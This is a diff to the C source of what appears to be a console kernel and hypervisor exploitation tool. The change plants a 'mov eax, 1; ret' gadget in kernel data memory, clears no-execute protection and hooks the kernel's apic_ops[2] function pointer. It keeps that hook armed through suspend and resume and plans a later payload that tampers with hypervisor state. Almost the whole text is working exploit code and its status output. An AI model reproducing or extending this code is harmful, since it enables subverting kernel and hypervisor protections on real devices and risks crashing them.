@@ -171,6 +171,9 @@ static uint64_t g_kmod_trampoline_target = 0;  /* KVA of g_trampoline_target in 
 static uint64_t g_kmod_gp_handler = 0;         /* KVA of gp_handler() in kmod .text */
 static int      g_kmod_kid = -1;               /* kldload file ID (-1 = not loaded) */
 
+/* Minimal xapic_mode gadget: `mov eax, 1; ret` in kdata cave (set by Phase 5b) */
+static uint64_t g_minimal_xapic_gadget = 0;    /* KVA of 6-byte gadget at kdata+0x150 */
+
 
 /* ─── DMAP base discovery ─── */
 
@@ -4108,6 +4111,7 @@ ring3_fallback:
                 #define CAVE_TRAMP_TOTAL      72     /* code + 8-byte target + 8-byte proof addr */
                 #define CAVE_PROOF_MARKER     0x4649524544215F21ULL  /* "FIRED!_!" */
                 #define CAVE_PROOF_OFFSET     0x1000 /* kdata_base+0x1000 = proof location (different page to avoid SMC) */
+                #define MINIMAL_GADGET_OFFSET 0x150  /* 6-byte `mov eax, 1; ret` for suspend-safe hook */
 
                 if (!g_kmod_trampoline_func) {
                     printf("=============================================\n");
@@ -4259,6 +4263,48 @@ ring3_fallback:
                             printf("[+] Proof marker write:     DISABLED (suspend safety)\n");
                             printf("[+] Guest PTE NX permanently cleared for this page.\n");
                             printf("[+] Phase 7 can now arm apic_ops[2] hook.\n");
+
+                            /*
+                             * Install minimal xapic_mode gadget at kdata+0x150.
+                             *
+                             * This is a standalone 6-byte function:
+                             *   mov eax, 1    ; APIC_MODE_XAPIC
+                             *   ret
+                             *
+                             * Unlike the full cave trampoline (which does memory loads
+                             * and stack operations to call through to original), this
+                             * gadget has ZERO memory references — it just returns 1.
+                             *
+                             * This makes it safe to leave armed during suspend/resume:
+                             * no DMAP writes, no stack pushes, no indirect calls.
+                             * All CPUs (primary + secondary) can execute it safely
+                             * during cpususpend_handler's LAPIC path.
+                             */
+                            uint8_t minimal_gadget[6] = {
+                                0xB8, 0x01, 0x00, 0x00, 0x00,  /* mov eax, 1 */
+                                0xC3                            /* ret */
+                            };
+                            uint64_t mg_kva = target_kva + MINIMAL_GADGET_OFFSET;
+                            uint64_t mg_pa  = target_pa + MINIMAL_GADGET_OFFSET;
+
+                            kernel_copyin(minimal_gadget,
+                                          g_dmap_base + mg_pa, 6);
+
+                            /* Verify */
+                            uint8_t mg_verify[6];
+                            kernel_copyout(g_dmap_base + mg_pa, mg_verify, 6);
+                            int mg_ok = (memcmp(minimal_gadget, mg_verify, 6) == 0);
+
+                            if (mg_ok) {
+                                g_minimal_xapic_gadget = mg_kva;
+                                printf("\n[+] Minimal xapic_mode gadget installed:\n");
+                                printf("[+]   KVA: 0x%016lx (kdata+0x%x)\n",
+                                       (unsigned long)mg_kva, MINIMAL_GADGET_OFFSET);
+                                printf("[+]   Code: mov eax, 1; ret (6 bytes)\n");
+                                printf("[+]   Safe for suspend: no memory refs, no stack ops\n");
+                            } else {
+                                printf("[-] Minimal gadget write verify failed.\n");
+                            }
                         } else {
                             printf("[-] PTE write failed — trampoline NOT installed.\n");
                         }
@@ -5163,17 +5209,32 @@ static void campaign_flatz_setup(void) {
                 printf(" — reinitialized.\n");
 
             /* ── apic_ops[2] persistence check ── */
+            uint64_t minimal_gadget_kva = g_kdata_base + MINIMAL_GADGET_OFFSET;
+            uint64_t cave_tramp_kva = g_kdata_base + CAVE_TRAMP_OFFSET;
+            int hook_is_minimal = (xapic_now == minimal_gadget_kva);
+            int hook_is_cave_tramp = (xapic_now == cave_tramp_kva);
+            int hook_is_original = orig_xapic && (xapic_now == orig_xapic);
+
             printf("\n[*] apic_ops[2] (xapic_mode):\n");
             printf("    Current value:  0x%016lx\n", (unsigned long)xapic_now);
-            if (orig_xapic) {
+            if (orig_xapic)
                 printf("    Original saved: 0x%016lx\n",
                        (unsigned long)orig_xapic);
-                if (xapic_now == orig_xapic)
-                    printf("    → MATCH — apic_ops[2] retained its value.\n");
-                else
-                    printf("    → CHANGED — kernel reinitialized apic_ops[2]!\n");
+            printf("    Minimal gadget: 0x%016lx\n",
+                   (unsigned long)minimal_gadget_kva);
+
+            if (hook_is_minimal) {
+                printf("    >>> MINIMAL GADGET HOOK SURVIVED SUSPEND! <<<\n");
+                printf("    apic_ops[2] still points to kdata+0x%x\n",
+                       MINIMAL_GADGET_OFFSET);
+                printf("    xapic_mode was called during resume and returned 1.\n");
+            } else if (hook_is_cave_tramp) {
+                printf("    → Points to cave trampoline (kdata+0x%x)\n",
+                       CAVE_TRAMP_OFFSET);
+            } else if (hook_is_original) {
+                printf("    → MATCH original — hook was restored or not armed.\n");
             } else {
-                printf("    Original saved: (unavailable)\n");
+                printf("    → CHANGED to unknown value — kernel reinitialized!\n");
             }
 
             /* ── Summary ── */
@@ -5186,16 +5247,44 @@ static void campaign_flatz_setup(void) {
                    qa_persisted ? "PERSISTED" : "reinitialized");
             printf("[+]   apic_ops[2] now: 0x%016lx\n",
                    (unsigned long)xapic_now);
-            if (orig_xapic) {
+            if (orig_xapic)
                 printf("[+]   Original xapic:  0x%016lx\n",
                        (unsigned long)orig_xapic);
-                if (xapic_now == orig_xapic)
-                    printf("[+]   apic_ops[2]:     RETAINED (value unchanged)\n");
-                else
-                    printf("[+]   apic_ops[2]:     CHANGED by kernel reinit\n");
+
+            if (hook_is_minimal) {
+                printf("[+]\n");
+                printf("[+] ============================================\n");
+                printf("[+]  APIC_OPS HOOK SURVIVED SUSPEND/RESUME!\n");
+                printf("[+] ============================================\n");
+                printf("[+]  apic_ops[2] → minimal gadget (mov eax,1; ret)\n");
+                printf("[+]  Hook was active during cpususpend_handler!\n");
+                printf("[+]  This confirms:\n");
+                printf("[+]    1. kdata code execution works during resume\n");
+                printf("[+]    2. NPT allows X on kdata during suspend path\n");
+                printf("[+]    3. Guest PTE NX-clear persists through S3\n");
+                printf("[+]    4. apic_ops[2] is NOT reinitialized by kernel\n");
+                printf("[+]\n");
+                printf("[+]  NEXT: Replace gadget with full payload trampoline\n");
+                printf("[+]  that reads/modifies HV state during resume.\n");
+
+                /* Restore original xapic_mode now that we've confirmed */
+                printf("\n[*] Restoring apic_ops[2] to original...\n");
+                kernel_copyin(&orig_xapic,
+                              g_dmap_base + ops_pa + 0x10, 8);
+                uint64_t restore_v = 0;
+                kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_v, 8);
+                printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
+                       (unsigned long)restore_v,
+                       restore_v == orig_xapic ? "OK" : "FAIL");
+            } else if (hook_is_original) {
+                printf("[+]   apic_ops[2]:     RETAINED (original value)\n");
+                printf("[*] Hook was either not armed or was restored.\n");
+            } else {
+                printf("[+]   apic_ops[2]:     CHANGED (0x%016lx)\n",
+                       (unsigned long)xapic_now);
             }
 
-            /* ── Cave trampoline proof marker check ── */
+            /* ── Cave trampoline proof marker check (legacy) ── */
             {
                 uint64_t proof_pa = va_to_pa_quiet(g_kdata_base);
                 uint64_t proof_val = 0;
@@ -5205,43 +5294,34 @@ static void campaign_flatz_setup(void) {
                                    &proof_val, 8);
                     tramp_fired = (proof_val == CAVE_PROOF_MARKER);
                 }
-                uint64_t cave_tramp_kva = g_kdata_base + CAVE_TRAMP_OFFSET;
-                int hook_points_to_cave = (xapic_now == cave_tramp_kva);
-
-                printf("\n[*] Cave trampoline resume check:\n");
-                printf("    Proof marker at kdata+0x%x: 0x%016lx\n",
-                       CAVE_PROOF_OFFSET, (unsigned long)proof_val);
-                printf("    Expected (FIRED!_!):        0x%016lx\n",
-                       (unsigned long)CAVE_PROOF_MARKER);
-                printf("    Cave tramp KVA:             0x%016lx\n",
-                       (unsigned long)cave_tramp_kva);
-                printf("    apic_ops[2] now:            0x%016lx\n",
-                       (unsigned long)xapic_now);
-
-                if (tramp_fired && hook_points_to_cave) {
-                    printf("    >>> TRAMPOLINE FIRED DURING RESUME! <<<\n");
-                    printf("    >>> Hook survived + proof marker written! <<<\n");
-                    printf("[+]   Cave tramp:      FIRED! (proof + hook confirmed)\n");
-                } else if (tramp_fired && !hook_points_to_cave) {
-                    printf("    >>> TRAMPOLINE FIRED but hook was restored! <<<\n");
-                    printf("    (kernel may have reinitialized apic_ops)\n");
-                    printf("[+]   Cave tramp:      FIRED (hook lost post-resume)\n");
-                } else if (!tramp_fired && hook_points_to_cave) {
-                    printf("    Hook still points to cave — trampoline survived suspend!\n");
-                    printf("    Proof marker write was disabled (suspend safety).\n");
-                    printf("    Trampoline likely fired and called through to original.\n");
-                    printf("[+]   Cave tramp:      SURVIVED (hook retained, proof disabled)\n");
-                } else {
-                    printf("    No proof marker, hook not pointing to cave.\n");
-                    printf("    Cave trampoline was not armed during suspend.\n");
-                    printf("[+]   Cave tramp:      NOT ARMED\n");
-                }
-
-                /* Clear proof marker for next cycle */
-                if (tramp_fired && proof_pa) {
+                if (tramp_fired) {
+                    printf("\n[+] Cave trampoline proof marker FOUND!\n");
+                    printf("    Proof: 0x%016lx (FIRED!_!)\n",
+                           (unsigned long)proof_val);
+                    /* Clear for next cycle */
                     uint64_t zero = 0;
                     kernel_copyin(&zero, g_dmap_base + proof_pa + CAVE_PROOF_OFFSET, 8);
-                    printf("[*] Proof marker cleared for next cycle.\n");
+                    printf("[*] Proof marker cleared.\n");
+                }
+            }
+
+            /* Verify minimal gadget code is intact post-resume */
+            if (cave_persisted) {
+                uint64_t mg_pa = va_to_pa_quiet(g_kdata_base);
+                if (mg_pa) {
+                    uint8_t mg_check[6];
+                    uint8_t mg_expected[6] = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3};
+                    kernel_copyout(g_dmap_base + mg_pa + MINIMAL_GADGET_OFFSET,
+                                   mg_check, 6);
+                    int mg_intact = (memcmp(mg_check, mg_expected, 6) == 0);
+                    printf("\n[*] Minimal gadget code (kdata+0x%x): %s\n",
+                           MINIMAL_GADGET_OFFSET,
+                           mg_intact ? "INTACT" : "CORRUPTED");
+                    if (!mg_intact) {
+                        printf("    Got: %02x %02x %02x %02x %02x %02x\n",
+                               mg_check[0], mg_check[1], mg_check[2],
+                               mg_check[3], mg_check[4], mg_check[5]);
+                    }
                 }
             }
 
@@ -5457,6 +5537,52 @@ static void campaign_flatz_setup(void) {
                        (unsigned long)g_kmod_trampoline_target);
             }
 
+            /*
+             * Phase 7 suspend strategy:
+             *
+             * If the minimal gadget is available (g_minimal_xapic_gadget),
+             * hook apic_ops[2] to point to it and LEAVE ARMED during suspend.
+             *
+             * The minimal gadget is `mov eax, 1; ret` — 6 bytes, no memory
+             * references, no stack operations, no DMAP writes.  This is the
+             * safest possible hook because xapic_mode just returns the APIC
+             * mode constant (1 = xAPIC).
+             *
+             * Previous attempts with the full cave trampoline (which does
+             * push/pop, memory loads, and indirect calls) caused panics
+             * when DMAP proof-marker writes were enabled.  The minimal
+             * gadget eliminates ALL memory operations.
+             *
+             * If the minimal gadget is NOT available, fall back to the
+             * old behavior (set markers only, restore before suspend).
+             */
+            int suspend_hook_armed = 0;
+            if (g_minimal_xapic_gadget && hook_armed) {
+                printf("\n[*] Step 4: Arming MINIMAL GADGET for suspend...\n");
+                printf("    Minimal gadget KVA: 0x%016lx (kdata+0x%x)\n",
+                       (unsigned long)g_minimal_xapic_gadget,
+                       MINIMAL_GADGET_OFFSET);
+                printf("    Code: B8 01 00 00 00 C3 (mov eax, 1; ret)\n");
+                printf("    No memory refs, no stack ops — suspend-safe.\n");
+
+                /* Point apic_ops[2] to minimal gadget */
+                kernel_copyin(&g_minimal_xapic_gadget,
+                              g_dmap_base + ops_pa + 0x10, 8);
+                uint64_t gadget_verify = 0;
+                kernel_copyout(g_dmap_base + ops_pa + 0x10, &gadget_verify, 8);
+                suspend_hook_armed = (gadget_verify == g_minimal_xapic_gadget);
+                printf("    apic_ops[2] = 0x%016lx [%s]\n",
+                       (unsigned long)gadget_verify,
+                       suspend_hook_armed ? "OK" : "FAIL");
+
+                if (!suspend_hook_armed) {
+                    /* Restore original on failure */
+                    printf("[!] Hook write failed — restoring original.\n");
+                    kernel_copyin(&original_xapic,
+                                  g_dmap_base + ops_pa + 0x10, 8);
+                }
+            }
+
             printf("\n[+] ============================================\n");
             printf("[+]  PHASE 7 PRE-SUSPEND SETUP COMPLETE\n");
             printf("[+] ============================================\n");
@@ -5464,13 +5590,15 @@ static void campaign_flatz_setup(void) {
             printf("[+] What was set:\n");
             printf("[+]   Cave marker:    FLATZHOO + original xapic\n");
             printf("[+]   QA flags:       Phase 7 marker + original xapic\n");
-            if (hook_armed) {
-                printf("[+]   apic_ops[2]:    HOOKED → %s trampoline\n",
-                       hook_is_cave ? "cave" : "KLD");
-                printf("[+]     trampoline calls original xapic_mode\n");
-                printf("[+]     Returns correct APIC mode — safe for suspend\n");
-                if (hook_is_cave)
-                    printf("[+]     Guest PTE NX permanently cleared for cave page\n");
+            if (suspend_hook_armed) {
+                printf("[+]   apic_ops[2]:    HOOKED → minimal gadget (mov eax,1; ret)\n");
+                printf("[+]     Returns 1 (xAPIC) — correct for all CPUs\n");
+                printf("[+]     LEAVING ARMED during suspend!\n");
+                printf("[+]     Guest PTE NX cleared for kdata page\n");
+                printf("[+]     NPT allows X on PA 0x3600000 (confirmed)\n");
+            } else if (hook_armed) {
+                printf("[+]   apic_ops[2]:    Cave trampoline (call-through)\n");
+                printf("[+]     Restoring to original before suspend.\n");
             } else {
                 printf("[+]   apic_ops[2]:    UNCHANGED (0x%016lx)\n",
                        (unsigned long)original_xapic);
@@ -5483,43 +5611,37 @@ static void campaign_flatz_setup(void) {
             printf("[+]   - apic_ops[2] retains value across resume\n");
             printf("[+]   - KASLR slide stable across resume\n");
             printf("[+]\n");
-            if (hook_armed) {
-                printf("[+] ACTION: Entering REST MODE programmatically!\n");
-                printf("[+]   On resume: cpususpend_handler calls xapic_mode\n");
-                printf("[+]   → %s trampoline → original → returns normally\n",
-                       hook_is_cave ? "cave" : "KLD");
-                printf("[+]   Hook restored to original before suspend.\n");
-                printf("[+]   Wake → re-exploit → re-run tool → check results\n");
-            } else {
-                printf("[+] NOTE: Hook not armed. Enter REST MODE to test\n");
-                printf("[+]   persistence markers only.\n");
-            }
 
-            if (hook_armed) {
+            if (suspend_hook_armed) {
+                printf("[+] ACTION: Entering REST MODE with hook ARMED!\n");
+                printf("[+]   apic_ops[2] → minimal gadget (kdata+0x%x)\n",
+                       MINIMAL_GADGET_OFFSET);
+                printf("[+]   On resume: cpususpend_handler calls xapic_mode\n");
+                printf("[+]   → minimal gadget returns 1 → resume continues\n");
+                printf("[+]   Wake → re-exploit → re-run tool → check results\n");
                 printf("[+]\n");
 
-                /*
-                 * ALWAYS restore apic_ops[2] to original before suspend.
-                 *
-                 * Leaving the cave trampoline armed during suspend causes
-                 * kernel panics.  Even with G=0, NX cleared, and NPT
-                 * allowing execution, the trampoline crashes when called
-                 * by secondary CPUs during the LAPIC suspend path.
-                 * Root cause likely: the HV/NPT context during
-                 * cpususpend_handler is more constrained than normal
-                 * execution — secondary CPUs may not have the same NPT
-                 * mappings or the kdata page may not be executable in
-                 * the suspend context.
-                 *
-                 * The hook was verified working on the primary CPU.
-                 * Persistence markers (cave + QA flags) will confirm
-                 * resume detection after wake.
-                 */
-                printf("[*] Restoring apic_ops[2] to original before rest mode.\n");
-                if (hook_is_cave)
-                    printf("    Cave trampoline: leaving armed causes kernel panic.\n");
-                else
-                    printf("    KLD pages may not be NPT-executable on secondary CPUs.\n");
+                /* Enter rest mode programmatically with hook armed */
+                printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
+                fflush(stdout);
+                fflush(stderr);
+                notify("[HV Research] Entering rest mode — hook ARMED!");
+                sleep(3);
+                int standby_ret = sceSystemStateMgrEnterStandby();
+                printf("[*] sceSystemStateMgrEnterStandby() returned %d\n",
+                       standby_ret);
+                if (standby_ret != 0) {
+                    printf("[!] Standby call failed (ret=%d, errno=%d).\n",
+                           standby_ret, errno);
+                    printf("[!] Restoring apic_ops[2] to original.\n");
+                    kernel_copyin(&original_xapic,
+                                  g_dmap_base + ops_pa + 0x10, 8);
+                    printf("[!] Navigate to: Settings → System → Power → Rest Mode\n");
+                    notify("[HV Research] Auto-standby failed! Hook restored.");
+                }
+            } else if (hook_armed) {
+                /* Fall back: restore cave trampoline to original before suspend */
+                printf("[*] Minimal gadget unavailable — restoring hook before suspend.\n");
                 kernel_copyin(&original_xapic,
                               g_dmap_base + ops_pa + 0x10, 8);
                 uint64_t restore_verify = 0;
@@ -5528,7 +5650,6 @@ static void campaign_flatz_setup(void) {
                        (unsigned long)restore_verify,
                        restore_verify == original_xapic ? "OK" : "FAIL");
 
-                /* Enter rest mode programmatically */
                 printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
                 fflush(stdout);
                 fflush(stderr);
@@ -5540,9 +5661,7 @@ static void campaign_flatz_setup(void) {
                 if (standby_ret != 0) {
                     printf("[!] Standby call failed (ret=%d, errno=%d).\n",
                            standby_ret, errno);
-                    printf("[!] Falling back to manual rest mode entry.\n");
-                    printf("[!] Navigate to: Settings → System → Power → Rest Mode\n");
-                    notify("[HV Research] Auto-standby failed! Manually enter rest mode.");
+                    notify("[HV Research] Auto-standby failed!");
                 }
             } else {
                 notify("[HV Research] Phase 7: Markers set. Enter REST MODE!");
